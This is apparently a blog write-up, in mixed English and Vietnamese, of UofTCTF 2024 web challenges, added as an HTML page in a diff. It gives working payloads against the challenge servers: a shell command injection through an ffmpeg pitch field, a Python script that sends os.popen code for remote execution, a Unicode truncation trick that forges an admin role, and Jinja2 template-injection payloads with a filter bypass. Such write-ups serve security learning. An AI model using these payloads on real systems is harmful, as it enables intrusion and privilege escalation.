@@ -1,0 +1,637 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>UofTCTF 2024 - Full WEB &#39;s challenges - Zoltán&#39;s Blog</title>
+  <meta name="description" content="WEB challs Voice change đề bài : Voice Changer vul : command injection
+When you go to the page you will see Flow : click to the micro will record voice Input pitch is fast or slow @@ after submit your voice will receive
+$ ffmpeg -i &quot;/app/upload/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; -y -af &quot;asetrate=44100*1,aresample=44100,atempo=1/1&quot; &quot;/app/output/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers built with gcc 13.2.1 (Alpine 13.2.1_git20231014) 20231014 configuration: --prefix=/usr --disable-librtmp --disable-lzma --disable-static --disable-stripping --enable-avfilter --enable-gpl --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libdav1d --enable-libdrm --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libharfbuzz --enable-libmp3lame --enable-libopenmpt --enable-libopus --enable-libplacebo --enable-libpulse --enable-librav1e --enable-librist --enable-libsoxr --enable-libsrt --enable-libssh --enable-libtheora --enable-libv4l2 --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxcb --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-lto=auto --enable-lv2 --enable-openssl --enable-pic --enable-postproc --enable-pthreads --enable-shared --enable-vaapi --enable-vdpau --enable-version3 --enable-vulkan --optflags=-O3 --enable-libjxl --enable-libsvtav1 --enable-libvpl libavutil 58.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-01-14-uoftctf2024\/",
+          "name": "Uof tctf 2024 full web \u0027s challenges"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "UofTCTF 2024 - Full WEB \u0027s challenges",
+  "description" : "WEB challs Voice change đề bài : Voice Changer vul : command injection\nWhen you go to the page you will see Flow : click to the micro will record voice Input pitch is fast or slow @@ after submit your voice will receive\n$ ffmpeg -i \u0026quot;\/app\/upload\/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg\u0026quot; -y -af \u0026quot;asetrate=44100*1,aresample=44100,atempo=1\/1\u0026quot; \u0026quot;\/app\/output\/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg\u0026quot; ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers built with gcc 13.2.1 (Alpine 13.2.1_git20231014) 20231014 configuration: --prefix=\/usr --disable-librtmp --disable-lzma --disable-static --disable-stripping --enable-avfilter --enable-gpl --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libdav1d --enable-libdrm --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libharfbuzz --enable-libmp3lame --enable-libopenmpt --enable-libopus --enable-libplacebo --enable-libpulse --enable-librav1e --enable-librist --enable-libsoxr --enable-libsrt --enable-libssh --enable-libtheora --enable-libv4l2 --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxcb --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-lto=auto --enable-lv2 --enable-openssl --enable-pic --enable-postproc --enable-pthreads --enable-shared --enable-vaapi --enable-vdpau --enable-version3 --enable-vulkan --optflags=-O3 --enable-libjxl --enable-libsvtav1 --enable-libvpl libavutil 58.",
+  "inLanguage" : "en",
+  "wordCount":  1088 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-01-14-uoftctf2024\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="UofTCTF 2024 - Full WEB &#39;s challenges" />
+<meta property="og:description" content="WEB challs Voice change đề bài : Voice Changer vul : command injection
+When you go to the page you will see Flow : click to the micro will record voice Input pitch is fast or slow @@ after submit your voice will receive
+$ ffmpeg -i &quot;/app/upload/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; -y -af &quot;asetrate=44100*1,aresample=44100,atempo=1/1&quot; &quot;/app/output/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers built with gcc 13.2.1 (Alpine 13.2.1_git20231014) 20231014 configuration: --prefix=/usr --disable-librtmp --disable-lzma --disable-static --disable-stripping --enable-avfilter --enable-gpl --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libdav1d --enable-libdrm --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libharfbuzz --enable-libmp3lame --enable-libopenmpt --enable-libopus --enable-libplacebo --enable-libpulse --enable-librav1e --enable-librist --enable-libsoxr --enable-libsrt --enable-libssh --enable-libtheora --enable-libv4l2 --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxcb --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-lto=auto --enable-lv2 --enable-openssl --enable-pic --enable-postproc --enable-pthreads --enable-shared --enable-vaapi --enable-vdpau --enable-version3 --enable-vulkan --optflags=-O3 --enable-libjxl --enable-libsvtav1 --enable-libvpl libavutil 58.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-01-14-uoftctf2024/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="UofTCTF 2024 - Full WEB &#39;s challenges" />
+  <meta name="twitter:description" content="WEB challs Voice change đề bài : Voice Changer vul : command injection
+When you go to the page you will see Flow : click to the micro will record voice Input pitch is fast or slow @@ after submit your …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>UofTCTF 2024 - Full WEB &#39;s challenges</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h2 id="web-challs">WEB challs</h2>
+<h3 id="voice-change">Voice change</h3>
+<p>đề bài : Voice Changer
+vul : command injection</p>
+<p>When you go to the page you will see
+<img src="https://hackmd.io/_uploads/r1JhL_OjT.png" alt="image"></p>
+<p>Flow : click to the micro will record voice
+Input pitch is fast or slow @@
+after submit your voice will receive</p>
+<pre><code>$ ffmpeg -i &quot;/app/upload/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot; -y -af &quot;asetrate=44100*1,aresample=44100,atempo=1/1&quot; &quot;/app/output/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg&quot;
+
+ffmpeg version 6.1 Copyright (c) 2000-2023 the FFmpeg developers
+  built with gcc 13.2.1 (Alpine 13.2.1_git20231014) 20231014
+  configuration: --prefix=/usr --disable-librtmp --disable-lzma --disable-static --disable-stripping --enable-avfilter --enable-gpl --enable-ladspa --enable-libaom --enable-libass --enable-libbluray --enable-libdav1d --enable-libdrm --enable-libfontconfig --enable-libfreetype --enable-libfribidi --enable-libharfbuzz --enable-libmp3lame --enable-libopenmpt --enable-libopus --enable-libplacebo --enable-libpulse --enable-librav1e --enable-librist --enable-libsoxr --enable-libsrt --enable-libssh --enable-libtheora --enable-libv4l2 --enable-libvidstab --enable-libvorbis --enable-libvpx --enable-libwebp --enable-libx264 --enable-libx265 --enable-libxcb --enable-libxml2 --enable-libxvid --enable-libzimg --enable-libzmq --enable-lto=auto --enable-lv2 --enable-openssl --enable-pic --enable-postproc --enable-pthreads --enable-shared --enable-vaapi --enable-vdpau --enable-version3 --enable-vulkan --optflags=-O3 --enable-libjxl --enable-libsvtav1 --enable-libvpl
+  libavutil      58. 29.100 / 58. 29.100
+  libavcodec     60. 31.102 / 60. 31.102
+  libavformat    60. 16.100 / 60. 16.100
+  libavdevice    60.  3.100 / 60.  3.100
+  libavfilter     9. 12.100 /  9. 12.100
+  libswscale      7.  5.100 /  7.  5.100
+  libswresample   5.  0.100 /  5.  0.100
+  libpostproc    57.  3.100 / 57.  3.100
+Input #0, matroska,webm, from '/app/upload/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg':
+  Metadata:
+    encoder         : Chrome
+  Duration: N/A, start: 0.000000, bitrate: N/A
+  Stream #0:0(eng): Audio: opus, 48000 Hz, mono, fltp (default)
+Stream mapping:
+  Stream #0:0 -&gt; #0:0 (opus (native) -&gt; vorbis (libvorbis))
+Press [q] to stop, [?] for help
+Output #0, ogg, to '/app/output/0a8445c0-b561-11ee-b2b7-a532f82fac95.ogg':
+  Metadata:
+    encoder         : Lavf60.16.100
+  Stream #0:0(eng): Audio: vorbis, 44100 Hz, mono, fltp (default)
+    Metadata:
+      encoder         : Lavc60.31.102 libvorbis
+size=       3kB time=00:00:00.03 bitrate= 742.6kbits/s speed=15.3x    
+[out#0/ogg @ 0x7f8d02d395c0] video:0kB audio:12kB subtitle:0kB other streams:0kB global headers:3kB muxing overhead: 29.082904%
+size=      15kB time=00:00:01.69 bitrate=  73.3kbits/s speed=24.4x   
+</code></pre><p>see this page use command to research</p>
+<p><img src="https://hackmd.io/_uploads/HySaIOuiT.png" alt="image"></p>
+<p>You can see the pitch will inject to ,atempo=1/1
+We use command &ldquo;1.7 $(ls -lha)&rdquo; to the pitch value
+Observe carefully And we can see the output
+View exploit</p>
+<p><img src="https://hackmd.io/_uploads/ryo1PudoT.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1MePO_iT.png" alt="image"></p>
+<p>You can see file secret.txt</p>
+<p><img src="https://hackmd.io/_uploads/SyDlP_Ooa.png" alt="image">
+Flags : <code>uoftctf{Y0URPitchIS70OH!9H}</code></p>
+<h3 id="no-code">No code</h3>
+<p>Explain :</p>
+<p><img src="https://hackmd.io/_uploads/ByEpwOujT.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ry_6P__ia.png" alt="image"></p>
+<p>flag : <code>uoftctf{r3g3x_3p1c_f41L_XDDD}</code></p>
+<p>POC:</p>
+<pre><code>import requests,json
+cmd=input('Commmand: ')
+PL=f&quot;\nstr(exec(\&quot;import os; result=os.popen(\'{cmd}\').read();\&quot;))+result&quot;
+print(PL)
+r=requests.post(
+    &quot;https://uoftctf-no-code.chals.io/execute&quot;,
+    data={&quot;code&quot;: PL}
+)
+data=json.loads(r.content.decode())
+print(data['output'][4:])
+</code></pre><h3 id="guestbook">GuestBook</h3>
+<p>Source code:</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;My Guestbook&lt;/title&gt;
+    &lt;script async=false defer=false&gt;
+        fetch(&quot;https://script.google.com/macros/s/AKfycbyMdMLPsRtvXmcQN1V2yR3Zv_HYI1jvVqOCNAZpx7xgXqSflgwrtcveyUaGB8eTZwkM/exec?sheetId=1PGFh37vMWFrdOnIoItnxiGAkIqSxlJDiDyklp9OVtoQ&quot;).then(x=&gt;x.json()).then(x=&gt;{
+            x.slice(x.length-11).forEach(entry =&gt;{
+                const el = document.createElement(&quot;li&quot;);
+                el.innerText = entry.Name + &quot; - &quot; + entry.Message
+                document.getElementById(&quot;entries&quot;).appendChild(el)
+            })
+            document.getElementById(&quot;loading&quot;)?.remove();
+        })
+    &lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;
+    Hi! I made this guestbook for my site, please sign it.
+&lt;/h1&gt;
+&lt;iframe name=&quot;dummyframe&quot; id=&quot;dummyframe&quot; style=&quot;display: none;&quot;&gt;&lt;/iframe&gt;
+&lt;h3 style=&quot;margin: 0&quot;&gt;Last 10 user entries in the guestbook:&lt;/h3&gt;
+&lt;p id=&quot;loading&quot; style=&quot;margin: 0&quot;&gt;Loading...&lt;/p&gt;
+&lt;ul id=&quot;entries&quot; style=&quot;margin: 0&quot;&gt;
+&lt;/ul&gt;
+
+&lt;h3&gt;Sign the guestbook:&lt;/h3&gt;
+&lt;form method=&quot;POST&quot; action=&quot;https://script.google.com/macros/s/AKfycbyMdMLPsRtvXmcQN1V2yR3Zv_HYI1jvVqOCNAZpx7xgXqSflgwrtcveyUaGB8eTZwkM/exec?sheetId=1PGFh37vMWFrdOnIoItnxiGAkIqSxlJDiDyklp9OVtoQ&quot;&gt;
+  &lt;input id=&quot;name&quot; name=&quot;name&quot; type=&quot;text&quot; placeholder=&quot;Name&quot; required&gt;
+  &lt;input id=&quot;message&quot; name=&quot;message&quot; type=&quot;text&quot; placeholder=&quot;Message&quot; required&gt;
+  &lt;button type=&quot;submit&quot;&gt;Send&lt;/button&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Nó sẽ gọi một file data theo như mình tìm hiểu thì đây là một file sheet và đoạn
+<code>exec?sheetId=1PGFh37vMWFrdOnIoItnxiGAkIqSxlJDiDyklp9OVtoQ</code></p>
+<p>Sẽ là một id riêng biệt cho một sheet
+Để xem được nó thì có 2 cách</p>
+<ul>
+<li>cách 1:
+<a href="https://docs.google.com/spreadsheets/d/1PGFh37vMWFrdOnIoItnxiGAkIqSxlJDiDyklp9OVtoQ">https://docs.google.com/spreadsheets/d/1PGFh37vMWFrdOnIoItnxiGAkIqSxlJDiDyklp9OVtoQ</a>
+sẽ mở một sheet lên và nó chứa flag trong module raw</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rysXOOuja.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BkVmudui6.png" alt="image"></p>
+<ul>
+<li>cách 2:
+Dùng app script của google hoặc cũng có thể dùng js cũng được</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SkKM_dOja.png" alt="image"></p>
+<p>Chạy code và nhận flag:</p>
+<p><img src="https://hackmd.io/_uploads/B1BfO_uip.png" alt="image"></p>
+<p>Flag: <code>uoftctf{@PP 5cRIP7 !5 s0 coOL}</code></p>
+<h3 id="jay-bank">Jay Bank</h3>
+<p>Đề bài : Jay&rsquo;s Bank
+Tag : <code>trick, mysql, white box</code>
+In db.js :</p>
+<p><img src="https://hackmd.io/_uploads/S1saouOo6.png" alt="image"></p>
+<p>This method converts object to string</p>
+<p>Flag exists in config.js</p>
+<p><img src="https://hackmd.io/_uploads/BywpoOdoa.png" alt="image"></p>
+<p>Maintains :</p>
+<p><img src="https://hackmd.io/_uploads/B1fToOuoT.png" alt="image"></p>
+<p>You can see column data contains max 255 chars
+Issue : length &gt; 255 cut off the excess data</p>
+<p>In routes:</p>
+<p><img src="https://hackmd.io/_uploads/SJT2jOdsp.png" alt="image"></p>
+<p>IF data.role = admin we can have flag</p>
+<pre><code>router.put(&quot;/profile&quot;, jwtAuth, async (req, res) =&gt; {
+  let username = req.user.username;
+
+  let existingData = await db.getData(username);
+  try {
+    existingData = JSON.parse(existingData);
+  } catch {
+    existingData = { role: &quot;user&quot; };
+  }
+
+  let { phone, credit_card, secret_question, secret_answer, current_password } =
+    req.body;
+
+  if (!current_password) {
+    return res.status(400).json({
+      success: false,
+      message: &quot;Missing current password&quot;,
+    });
+  }
+
+  if (
+    !(
+      typeof current_password === &quot;string&quot; &amp;&amp;
+      (await db.verifyPassword(username, current_password))
+    )
+  ) {
+    return res
+      .status(401)
+      .json({ success: false, message: &quot;Invalid current password&quot; });
+  }
+
+  if (!phone || !credit_card || !secret_question || !secret_answer) {
+    return res.status(400).json({ success: false, message: &quot;Missing fields&quot; });
+  }
+
+  if (phone.length !== 10 || isNaN(phone)) {
+    return res
+      .status(400)
+      .json({ success: false, message: &quot;Invalid phone number&quot; });
+  }
+
+  if (credit_card.length !== 16 || isNaN(credit_card)) {
+    return res
+      .status(400)
+      .json({ success: false, message: &quot;Invalid credit card number&quot; });
+  }
+
+  if (typeof secret_question !== &quot;string&quot; || secret_question.length &gt; 45) {
+    return res
+      .status(400)
+      .json({ success: false, message: &quot;Invalid secret question&quot; });
+  }
+
+  if (typeof secret_answer !== &quot;string&quot; || secret_answer.length &gt; 45) {
+    return res
+      .status(400)
+      .json({ success: false, message: &quot;Invalid secret answer&quot; });
+  }
+
+  try {
+    await db.updateData(
+      username,
+      db.convert({
+        phone,
+        credit_card,
+        secret_question,
+        secret_answer,
+        role: &quot;user&quot;,
+      })
+    );
+
+    return res
+      .status(200)
+      .json({ success: true, message: &quot;Successfully updated&quot; });
+  } catch {
+    return res
+      .status(400)
+      .json({ success: false, message: &quot;Failed to update DB&quot; });
+  }
+});
+</code></pre><p>check secret_answer.length &gt; 45
+Remember to unicode: <code>&quot;İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ&quot;</code></p>
+<p>Length will &gt; 45
+ToLOwerCase() will length &gt; 255 and role: &ldquo;user&rdquo;, will be cut</p>
+<pre><code>payload = {
+    &quot;phone&quot;: &quot;1234567890&quot;,
+    &quot;credit_card&quot;: &quot;1234567890987654&quot;,
+    &quot;secret_question&quot;: &quot;İİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİİ&quot;, 
+    &quot;secret_answer&quot;: 'İİİİİİİİİİİİİİİİİİİİİİİİ&quot;,&quot;role&quot;:&quot;admin&quot;}',
+    &quot;current_password&quot;: account['password']
+}
+</code></pre><p>Flag : <code>in content</code></p>
+<h3 id="myfirstapp">MyFirstApp</h3>
+<p><img src="https://hackmd.io/_uploads/SkDK5_uja.png" alt="image"></p>
+<p>Start this challenge i know this is ssti vulnerability but i sit to bypass regex</p>
+<p><img src="https://hackmd.io/_uploads/HkCY9_dja.png" alt="image"></p>
+<p>I have thought about it in jwt but if I don&rsquo;t do it, it won&rsquo;t work
+Suggestions from the guys in the club i solver this challenge :
+Brute-force key, we have &ldquo;torontobluejays&rdquo;
+Let change username to RCE:
+Use payload jinja2(Python):</p>
+<pre><code>    ```{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}```
+</code></pre>
+<ul>
+<li>Malicious stuff: [&quot;'&quot;, &lsquo;_&rsquo;, &lsquo;os&rsquo;, &lsquo;popen&rsquo;, &lsquo;global&rsquo;]</li>
+</ul>
+<p>{{()|attr((request|string).17~(request|string).18~(request|string).19~(request|string).20~(request|string).21~(request|string).22~(request|string).23~(request|string).24~(request|string).25)}}
+RCE success you you will have flag
+ý tưởng là từ đó mình có thể nối các chuỗi
+Flags:  <code>mình chưa test lại mà luồng đúng rồi nha :#</code></p>
+<h3 id="the-varsity">The Varsity</h3>
+<p>đề bài : The Varsity
+vul : parseInt vul in javascript</p>
+<p>View source have main you can get the flag</p>
+<p><img src="https://hackmd.io/_uploads/Skvrq_usa.png" alt="image"></p>
+<p>You must show item 10 to view it
+Main function:</p>
+<p><img src="https://hackmd.io/_uploads/Hy-rcOOsT.png" alt="image"></p>
+<p>Firstly, verify token
+Firewall 1:</p>
+<p><img src="https://hackmd.io/_uploads/S1_Vq_ujT.png" alt="image"></p>
+<p>Get issue from your from and check issue must &gt; 0
+Check if subscription !== &ldquo;subscription&rdquo; &amp;&amp; issue &gt; 9
+You understand if all condition are true and subscription !== &ldquo;subscription&rdquo; you cant&rsquo;t control it so you can control issue
+After that, parseInt(issue)</p>
+<p><img src="https://hackmd.io/_uploads/SyX49O_op.png" alt="image"></p>
+<p>Verify issue is number or issue &gt; articles.length - 1
+Solution 1:</p>
+<p><img src="https://hackmd.io/_uploads/BJ6m9Odsp.png" alt="image"></p>
+<ul>
+<li>You can search parseInt in google to understand it
++If you control issue = &ldquo;9+5&rdquo;; issue &gt; 9 and parseInt(issue) is Number
+And so we get flag : : <code>uoftctf{w31rd_b3h4v10r_0f_parseInt()!}</code></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SJLm9O_ia.png" alt="image"></p>
+<p>+If you control issue = &ldquo;9 years&rdquo;; issue &gt; 9 and parseInt(issue) is Number</p>
+<p><img src="https://hackmd.io/_uploads/HJ-7cd_i6.png" alt="image"></p>
+<pre><code>parseInt(&quot;10&quot;); =&gt; 10
+parseInt(&quot;10.00&quot;); =&gt; 10
+parseInt(&quot;10.33&quot;); =&gt; 10
+parseInt(&quot;34 45 66&quot;); =&gt; 34
+parseInt(&quot; 60 &quot;); =&gt; 60
+parseInt(&quot;40 years&quot;); =&gt; 40
+parseInt(&quot;He was 40&quot;); =&gt; NaN
+</code></pre><p>flag : <code>uoftctf{w31rd_b3h4v10r_0f_parseInt()!}</code></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-06-16-vsctf2024/" data-toggle="tooltip" data-placement="top" title="vsCTF2024 - WEB &#39;s challenges">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-04-06-tamusctf2024/" data-toggle="tooltip" data-placement="top" title="Tamus CTF 2024 - some WEB &#39;s challenges">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
